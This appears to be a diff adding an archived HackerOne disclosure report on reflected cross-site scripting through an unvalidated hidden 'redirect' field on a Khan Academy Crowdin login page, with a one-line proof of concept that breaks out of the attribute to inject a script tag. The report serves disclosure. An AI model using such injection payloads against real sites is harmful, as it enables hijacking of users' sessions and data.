@@ -1,0 +1,16 @@
+# HackerOne Report: Unchecking hidden parameter is vulnerable to XSS-attack
+**Report ID:** 13506
+**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
+
+## Vulnerability Information & PoC
+Unchecking parameter <input type="hidden" name="redirect">
+
+Malicious users may inject JavaScript, VBScript, ActiveX, HTML or Flash into a vulnerable application to fool a user in order to gather data from them.
+
+http://crowdin.khanacademy.org:/login
+
+PoC
+<input type="hidden" name="redirect" value="/project_actions/load_discussions/"><script>prompt(986874)</script>"/>
+
+
+## Discussion & Remediation Timeline
